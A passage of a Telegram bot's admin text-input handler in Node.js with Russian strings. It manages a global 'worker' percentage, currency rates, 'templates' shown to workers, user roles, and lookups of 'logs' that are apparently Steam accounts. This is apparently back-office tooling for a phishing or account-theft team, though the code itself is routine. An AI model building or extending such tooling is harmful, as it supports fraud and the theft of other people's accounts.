      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard("admin:apps:questions").reply_markup,
        });
      }
      return;
    }

    if (adminInput?.type === "global_percent") {
      const percent = Number(text.replace("%", "").replace(",", "."));
      if (!Number.isFinite(percent) || percent < 1 || percent > 100) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Глобальный процент должен быть числом от 1 до 100.`,
          { reply_markup: adminCancelKeyboard("admin:economy").reply_markup }
        );
        return;
      }
      const previous = await getGlobalWorkerPercent();
      const updated = await setGlobalWorkerPercent(percent);
      ctx.session.adminInput = null;
      if (Number(previous) !== Number(updated)) {
        try {
          await announceWorkerPercentChange(ctx.telegram, {
            from: previous,
            to: updated,
            adminTelegramId: String(ctx.from?.id || "admin"),
          });
        } catch (_) {
          /* panel + TG notify is best-effort */
        }
      }
      await upsertBotMessage(
        ctx,
        `${pe("success")} Глобальный процент воркера обновлён: <b>${updated}%</b>\nПрименено ко всем пользователям.`,
        { reply_markup: adminResultKeyboard("admin:economy").reply_markup }
      );
      return;
    }

    if (adminInput?.type === "currency_rate") {
      const rate = Number(text.replace(",", ".").replace(/\s/g, ""));
      if (!Number.isFinite(rate) || rate <= 0) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Введите корректный курс (число больше 0).`,
          { reply_markup: adminCancelKeyboard("admin:economy").reply_markup }
        );
        return;
      }
      try {
        const updated = await setUsdRubRate(rate);
        ctx.session.adminInput = null;
        await upsertBotMessage(
          ctx,
          `${pe("success")} Курс обновлён: <b>1 USD = ${updated} RUB</b>`,
          { reply_markup: adminResultKeyboard("admin:economy").reply_markup }
        );
      } catch (e) {
        await upsertBotMessage(ctx, `${pe("error")} ${e.message}`, {
          reply_markup: adminCancelKeyboard("admin:economy").reply_markup,
        });
      }
      return;
    }

    if (adminInput?.type === "template_enable") {
      const templateId = Math.trunc(Number(String(text).replace(/\s/g, "")));
      if (!Number.isFinite(templateId) || templateId < 1) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Введите корректный ID шаблона (число больше 0).`,
          { reply_markup: adminCancelKeyboard("admin:templates").reply_markup }
        );
        return;
      }
      ctx.session.adminInput = { type: "template_name", templateId };
      await upsertBotMessage(
        ctx,
        [
          `${pe("edit")} <b>Название шаблона</b>`,
          "",
          `ID: <code>${templateId}</code>`,
          "Введите <b>своё название</b> — так шаблон увидят воркеры.",
          "",
          "Или отправьте <code>-</code>, чтобы взять название из каталога.",
        ].join("\n"),
        { reply_markup: adminCancelKeyboard("admin:templates").reply_markup }
      );
      return;
    }

    if (adminInput?.type === "template_name") {
      const templateId = Number(adminInput.templateId);
      const customName = text === "-" ? "" : String(text).trim().slice(0, 80);
      if (text !== "-" && !customName) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Введите название или <code>-</code> для названия из каталога.`,
          { reply_markup: adminCancelKeyboard("admin:templates").reply_markup }
        );
        return;
      }
      try {
        const admin = await ensureUser(ctx.from);
        const result = await enableTemplateById(admin, templateId, { name: customName });
        ctx.session.adminInput = null;
        const name = result.template?.name || `Template #${templateId}`;
        const header = [
          `${pe("success")} Включён: <b>${escapeAdminHtml(name)}</b> <code>#${templateId}</code>`,
        ];
        if (!customName && result.resolved === false) {
          header.push("<i>Название в каталоге не найдено — использован Template #ID.</i>");
        }
        const view = await buildAdminTemplatesView(header);
        await upsertBotMessage(ctx, view.text, { reply_markup: view.reply_markup });
      } catch (e) {
        await upsertBotMessage(ctx, `${pe("error")} ${e.message}`, {
          reply_markup: adminCancelKeyboard("admin:templates").reply_markup,
        });
      }
      return;
    }

    if (adminInput?.type === "template_rename") {
      const templateId = Number(adminInput.templateId);
      const customName = String(text).trim().slice(0, 80);
      if (!customName || customName === "-") {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Введите название шаблона.`,
          { reply_markup: adminCancelKeyboard("admin:templates").reply_markup }
        );
        return;
      }
      try {
        const result = await renameTemplateById(null, templateId, customName);
        ctx.session.adminInput = null;
        const name = result.template?.name || customName;
        const view = await buildAdminTemplatesView([
          `${pe("success")} Название обновлено: <b>${escapeAdminHtml(name)}</b> <code>#${templateId}</code>`,
        ]);
        await upsertBotMessage(ctx, view.text, { reply_markup: view.reply_markup });
      } catch (e) {
        await upsertBotMessage(ctx, `${pe("error")} ${e.message}`, {
          reply_markup: adminCancelKeyboard("admin:templates").reply_markup,
        });
      }
      return;
    }

    if (adminInput?.type === "search_user") {
      const member = await findUserByQuery(text);
      if (!member) {
        await upsertBotMessage(ctx, `${pe("error")} Пользователь не найден. Введите @username или ID ещё раз.`, {
          reply_markup: adminCancelKeyboard("admin:panel").reply_markup,
        });
        return;
      }
      ctx.session.adminInput = null;
      const currencyCtx = await getCurrencyContext();
      await upsertBotMessage(ctx, await renderMemberCardHtml(member, currencyCtx), {
        reply_markup: memberActionKeyboard(member.telegramId, member.isBanned, member.isCurator, member.isCaller, member.isModerator, member).reply_markup,
      });
      return;
    }

    if (adminInput?.type === "search_log") {
      const logId = String(text || "").trim().replace(/\s+/g, "");
      if (!/^\d+$/.test(logId)) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Введите числовой ID лога из панели.`,
          { reply_markup: adminCancelKeyboard("admin:logs").reply_markup }
        );
        return;
      }
      try {
        const account = await fetchSteamAccountById(logId);
        ctx.session.adminInput = null;
        // Удаляем предыдущий UI-экран поиска.
        const prevId = ctx.session?.ui?.messageId;
        if (prevId && ctx.chat?.id) {
          try {
            await ctx.telegram.deleteMessage(ctx.chat.id, prevId);
          } catch (_) {
            /* ignore */
          }
        }
        const sent = await sendAdminLogCard(ctx.telegram, ctx.chat.id, account);
        if (ctx.session && sent?.message_id) {
          ctx.session.ui = { ...(ctx.session.ui || {}), messageId: sent.message_id };
        }
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${error.message}`, {
          reply_markup: adminCancelKeyboard("admin:logs").reply_markup,
        });
      }
      return;
    }

    try {
      await ctx.telegram.sendMessage(
        compose.telegramId,
        `${pe("broadcast")} <b>Сообщение от администратора</b>\n\n${text}`,
        { parse_mode: "HTML" }
      );
      await upsertBotMessage(
        ctx,
        `${pe("success")} Сообщение отправлено пользователю <code>${compose.telegramId}</code>.`,
        { reply_markup: adminResultKeyboard().reply_markup }
      );
    } catch (error) {
      await upsertBotMessage(
        ctx,
        `${pe("error")} Не удалось отправить сообщение пользователю.`,
        { reply_markup: adminBackKeyboard().reply_markup }
      );
    } finally {
      ctx.session.adminCompose = null;
    }
  });
}

module.exports = { registerTextHandlers };
